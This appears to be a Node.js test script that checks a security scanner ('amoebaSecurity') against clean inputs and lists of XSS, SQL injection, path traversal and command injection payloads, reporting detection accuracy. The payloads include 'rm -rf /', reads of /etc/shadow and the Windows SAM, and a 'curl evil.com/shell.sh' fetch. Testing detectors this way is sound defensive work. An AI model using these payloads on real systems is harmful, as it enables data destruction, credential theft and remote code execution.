#!/usr/bin/env node
/**
 * ╔═══════════════════════════════════════════════════════════════════════════╗
 * ║   OBSERVER SIMULATION - Anomaly Detection Testing                         ║
 * ║   "Self-trust loop verification system"                                   ║
 * ╚═══════════════════════════════════════════════════════════════════════════╝
 *
 * Simulates various user input patterns to test:
 * 1. Amoeba security response times
 * 2. False positive rates
 * 3. Attack vector detection
 * 4. Behavioral analysis accuracy
 * 5. Rate limiting effectiveness
 */

import { amoebaSecurity } from '../core/amoeba-security.js';

const COLORS = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    cyan: '\x1b[36m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    magenta: '\x1b[35m',
    red: '\x1b[31m'
};

// Test cases organized by category
const testSuites = {
    // Clean inputs that should NOT be blocked
    cleanInputs: [
        { input: 'Hello, how are you today?', name: 'Basic greeting' },
        { input: 'What is the weather like?', name: 'Simple question' },
        { input: 'Calculate 2 + 2 for me', name: 'Math request' },
        { input: 'Tell me about JavaScript programming', name: 'Technical question' },
        { input: 'I need help with my project', name: 'Help request' },
        { input: 'The quick brown fox jumps over the lazy dog', name: 'Pangram' },
        { input: 'Please summarize this article', name: 'Summary request' },
        { input: 'What are best practices for security?', name: 'Security question' },
        { input: 'Explain how databases work', name: 'DB explanation' },
        { input: 'Write a poem about nature', name: 'Creative request' }
    ],

    // XSS attack vectors
    xssAttacks: [
        { input: '<script>alert("XSS")</script>', name: 'Basic script tag' },
        { input: '<img src=x onerror=alert(1)>', name: 'Image onerror' },
        { input: 'javascript:alert(document.cookie)', name: 'JS protocol' },
        { input: '<svg onload=alert(1)>', name: 'SVG onload' },
        { input: '<body onmouseover=alert(1)>', name: 'Body event' },
        { input: 'eval(atob("YWxlcnQoMSk="))', name: 'Eval base64' },
        { input: 'document.location="http://evil.com"', name: 'Location redirect' },
        { input: 'window.opener.document.body.innerHTML', name: 'Window opener' }
    ],

    // SQL injection vectors
    sqlInjection: [
        { input: "' OR '1'='1", name: 'Classic OR 1=1' },
        { input: "'; DROP TABLE users; --", name: 'DROP TABLE' },
        { input: "UNION SELECT * FROM passwords", name: 'UNION SELECT' },
        { input: "1; INSERT INTO admin VALUES('hacker')", name: 'INSERT injection' },
        { input: "admin'--", name: 'Comment bypass' },
        { input: "1' AND (SELECT COUNT(*) FROM users)>0--", name: 'Blind SQLi' },
        { input: "%27%20OR%20%271%27%3D%271", name: 'URL encoded SQLi' }
    ],

    // Path traversal vectors
    pathTraversal: [
        { input: '../../../etc/passwd', name: 'Unix passwd' },
        { input: '..\\..\\..\\windows\\system32\\config\\sam', name: 'Windows SAM' },
        { input: '....//....//etc/shadow', name: 'Double dot bypass' },
        { input: '%2e%2e%2f%2e%2e%2fetc/passwd', name: 'URL encoded' },
        { input: '/proc/self/environ', name: 'Proc environ' },
        { input: '..%252f..%252f..%252fetc/passwd', name: 'Double encoded' }
    ],

    // Command injection vectors
    commandInjection: [
        { input: '; cat /etc/passwd', name: 'Semicolon cat' },
        { input: '| ls -la', name: 'Pipe ls' },
        { input: '`id`', name: 'Backtick id' },
        { input: '$(whoami)', name: 'Dollar whoami' },
        { input: '&& rm -rf /', name: 'AND rm -rf' },
        { input: '|| curl evil.com/shell.sh', name: 'OR curl' }
    ],

    // Behavioral anomalies
    behavioral: [
        { input: 'A'.repeat(15000), name: 'Extremely long input' },
        { input: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.repeat(10), name: 'Repeated pattern' },
        { input: '!@#$%^&*()_+{}|:"<>?~`-=[]\\;\',./', name: 'All special chars' },
        { input: '\x00\x01\x02\x03\x04\x05', name: 'Null bytes' },
        { input: String.fromCharCode(...Array(256).keys()), name: 'All ASCII' }
    ]
};

async function runObserverSimulation() {
    console.log(`
${COLORS.magenta}╔═══════════════════════════════════════════════════════════════════════════╗
║   OBSERVER SIMULATION - Anomaly Detection Testing                         ║
║   Self-trust loop verification system                                     ║
╚═══════════════════════════════════════════════════════════════════════════╝${COLORS.reset}
`);

    const results = {
        cleanInputs: { passed: 0, failed: 0, details: [] },
        xssAttacks: { passed: 0, failed: 0, details: [] },
        sqlInjection: { passed: 0, failed: 0, details: [] },
        pathTraversal: { passed: 0, failed: 0, details: [] },
        commandInjection: { passed: 0, failed: 0, details: [] },
        behavioral: { passed: 0, failed: 0, details: [] }
    };

    const startTime = Date.now();

    // Test clean inputs (should NOT be blocked)
    console.log(`${COLORS.cyan}◈ Testing Clean Inputs (should pass)${COLORS.reset}`);
    console.log('─'.repeat(60));

    for (const test of testSuites.cleanInputs) {
        const scanStart = Date.now();
        const result = await amoebaSecurity.scan(test.input, {});
        const latency = Date.now() - scanStart;

        if (!result.blocked) {
            results.cleanInputs.passed++;
            console.log(`  ${COLORS.green}✓${COLORS.reset} ${test.name.padEnd(25)} | Risk: ${String(result.riskLevel).padStart(3)}% | ${latency}ms`);
        } else {
            results.cleanInputs.failed++;
            console.log(`  ${COLORS.red}✗${COLORS.reset} ${test.name.padEnd(25)} | FALSE POSITIVE! Risk: ${result.riskLevel}%`);
            results.cleanInputs.details.push({ test: test.name, result });
        }
    }

    // Test attack vectors (should be blocked)
    const attackSuites = ['xssAttacks', 'sqlInjection', 'pathTraversal', 'commandInjection'];

    for (const suiteName of attackSuites) {
        const suite = testSuites[suiteName];
        const displayName = suiteName.replace(/([A-Z])/g, ' $1').trim();

        console.log(`\n${COLORS.cyan}◈ Testing ${displayName} (should block)${COLORS.reset}`);
        console.log('─'.repeat(60));

        for (const test of suite) {
            const scanStart = Date.now();
            const result = await amoebaSecurity.scan(test.input, {});
            const latency = Date.now() - scanStart;

            if (result.blocked) {
                results[suiteName].passed++;
                console.log(`  ${COLORS.green}✓${COLORS.reset} ${test.name.padEnd(25)} | Risk: ${String(result.riskLevel).padStart(3)}% | BLOCKED | ${latency}ms`);
            } else {
                results[suiteName].failed++;
                console.log(`  ${COLORS.red}✗${COLORS.reset} ${test.name.padEnd(25)} | FALSE NEGATIVE! Risk: ${result.riskLevel}%`);
                results[suiteName].details.push({ test: test.name, result, input: test.input.substring(0, 50) });
            }
        }
    }

    // Test behavioral anomalies
    console.log(`\n${COLORS.cyan}◈ Testing Behavioral Anomalies${COLORS.reset}`);
    console.log('─'.repeat(60));

    for (const test of testSuites.behavioral) {
        const scanStart = Date.now();
        const result = await amoebaSecurity.scan(test.input, {});
        const latency = Date.now() - scanStart;

        // Behavioral should at least flag anomalies
        if (result.anomalies.length > 0 || result.riskLevel >= 20) {
            results.behavioral.passed++;
            console.log(`  ${COLORS.green}✓${COLORS.reset} ${test.name.padEnd(25)} | Risk: ${String(result.riskLevel).padStart(3)}% | Anomalies: ${result.anomalies.length} | ${latency}ms`);
        } else {
            results.behavioral.failed++;
            console.log(`  ${COLORS.yellow}?${COLORS.reset} ${test.name.padEnd(25)} | Risk: ${result.riskLevel}% | No anomalies detected`);
        }
    }

    // Rate limiting test
    console.log(`\n${COLORS.cyan}◈ Testing Rate Limiting${COLORS.reset}`);
    console.log('─'.repeat(60));

    const rateContext = { recentInputs: [] };
    const now = Date.now();

    // Simulate 35 requests in the last minute
    for (let i = 0; i < 35; i++) {
        rateContext.recentInputs.push(now - (i * 1000));
    }

    const rateResult = await amoebaSecurity.scan('Rate limit test', rateContext);
    if (rateResult.anomalies.some(a => a.includes('Rate limit'))) {
        console.log(`  ${COLORS.green}✓${COLORS.reset} Rate limiting detected (35 req/min)`);
    } else {
        console.log(`  ${COLORS.yellow}?${COLORS.reset} Rate limiting not triggered`);
    }

    const totalTime = Date.now() - startTime;

    // Summary
    console.log(`
${COLORS.magenta}╔═══════════════════════════════════════════════════════════════════════════╗
║                           SIMULATION SUMMARY                              ║
╠═══════════════════════════════════════════════════════════════════════════╣${COLORS.reset}
${COLORS.cyan}║  Category           │ Passed │ Failed │ Accuracy                         ║${COLORS.reset}
${COLORS.dim}║─────────────────────┼────────┼────────┼──────────────────────────────────║${COLORS.reset}`);

    let totalPassed = 0;
    let totalFailed = 0;

    for (const [category, data] of Object.entries(results)) {
        const displayName = category.replace(/([A-Z])/g, ' $1').trim();
        const accuracy = data.passed + data.failed > 0
            ? ((data.passed / (data.passed + data.failed)) * 100).toFixed(1)
            : '100.0';

        const accuracyColor = parseFloat(accuracy) >= 90 ? COLORS.green :
            parseFloat(accuracy) >= 70 ? COLORS.yellow : COLORS.red;

        console.log(`${COLORS.reset}║  ${displayName.padEnd(19)} │ ${String(data.passed).padStart(6)} │ ${String(data.failed).padStart(6)} │ ${accuracyColor}${accuracy.padStart(5)}%${COLORS.reset}                           ║`);

        totalPassed += data.passed;
        totalFailed += data.failed;
    }

    const overallAccuracy = ((totalPassed / (totalPassed + totalFailed)) * 100).toFixed(1);

    console.log(`${COLORS.magenta}╠═══════════════════════════════════════════════════════════════════════════╣
║  TOTAL              │ ${String(totalPassed).padStart(6)} │ ${String(totalFailed).padStart(6)} │ ${overallAccuracy.padStart(5)}%                           ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  Simulation Time: ${String(totalTime).padEnd(6)}ms                                           ║
║  Security Metrics:                                                        ║
║    • Total Scans:  ${String(amoebaSecurity.getMetrics().scans).padEnd(10)}                                        ║
║    • Total Blocked: ${String(amoebaSecurity.getMetrics().blocked).padEnd(10)}                                       ║
║    • Anomalies:     ${String(amoebaSecurity.getMetrics().anomalies).padEnd(10)}                                       ║
╚═══════════════════════════════════════════════════════════════════════════╝${COLORS.reset}
`);

    // Report any issues
    if (totalFailed > 0) {
        console.log(`${COLORS.yellow}⚠️  Issues Found:${COLORS.reset}`);
        for (const [category, data] of Object.entries(results)) {
            if (data.details.length > 0) {
                console.log(`  ${category}:`);
                for (const issue of data.details) {
                    console.log(`    - ${issue.test}: Risk ${issue.result.riskLevel}%`);
                }
            }
        }
    } else {
        console.log(`${COLORS.green}✓ All tests passed! Self-trust loop verified.${COLORS.reset}`);
    }

    return {
        success: totalFailed === 0,
        passed: totalPassed,
        failed: totalFailed,
        accuracy: overallAccuracy,
        duration: totalTime
    };
}

// Run simulation
runObserverSimulation()
    .then(result => {
        process.exit(result.success ? 0 : 1);
    })
    .catch(err => {
        console.error('Simulation failed:', err.message);
        process.exit(1);
    });
